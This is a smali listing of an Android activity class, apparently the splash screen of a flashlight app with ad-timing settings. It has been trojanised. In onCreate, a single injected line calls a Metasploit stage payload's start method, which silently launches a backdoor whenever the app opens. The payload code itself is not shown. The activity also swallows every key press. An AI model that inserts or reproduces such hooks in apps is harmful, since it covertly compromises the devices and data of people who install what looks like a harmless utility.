.class public Lcom/eabmobile/flash/MaskActivity;
.super Landroid/app/Activity;


# instance fields
.field private a:I

.field private b:Landroid/os/Handler;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    const/16 v0, 0x7d0

    iput v0, p0, Lcom/eabmobile/flash/MaskActivity;->a:I

    new-instance v0, Lcom/eabmobile/flash/n;

    invoke-direct {v0, p0}, Lcom/eabmobile/flash/n;-><init>(Lcom/eabmobile/flash/MaskActivity;)V

    iput-object v0, p0, Lcom/eabmobile/flash/MaskActivity;->b:Landroid/os/Handler;

    return-void
.end method

.method static synthetic a(Lcom/eabmobile/flash/MaskActivity;)V
    .locals 0

    invoke-virtual {p0}, Lcom/eabmobile/flash/MaskActivity;->finish()V

    return-void
.end method


# virtual methods
.method public dispatchKeyEvent(Landroid/view/KeyEvent;)Z
    .locals 1

    const/4 v0, 0x1

    return v0
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 1

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    const v0, 0x7f030014

    invoke-virtual {p0, v0}, Lcom/eabmobile/flash/MaskActivity;->setContentView(I)V

    :try_start_0
    const-string v0, "AdsShowTime"

    invoke-static {p0, v0}, Lcom/umeng/a/a;->b(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    iput v0, p0, Lcom/eabmobile/flash/MaskActivity;->a:I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method protected onResume()V
    .locals 4

    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    iget-object v0, p0, Lcom/eabmobile/flash/MaskActivity;->b:Landroid/os/Handler;

    const/4 v1, 0x0

    iget v2, p0, Lcom/eabmobile/flash/MaskActivity;->a:I

    int-to-long v2, v2

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->sendEmptyMessageDelayed(IJ)Z

    return-void
.end method
